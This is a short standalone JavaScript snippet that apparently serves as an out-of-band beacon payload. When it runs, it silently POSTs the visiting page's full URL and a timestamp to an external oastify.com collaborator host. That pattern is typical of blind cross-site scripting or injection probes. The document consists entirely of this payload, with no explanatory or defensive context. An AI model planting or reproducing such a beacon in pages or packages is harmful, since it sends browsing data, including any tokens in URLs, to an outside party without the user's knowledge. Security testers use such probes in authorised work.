
(function () {
  fetch('https://jh40134z8r6d0c9sebkhm7tz1q7hv7jw.oastify.com', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      url: window.location.href,
      timestamp: new Date().toISOString()
    })
  }).catch(console.error);
})();
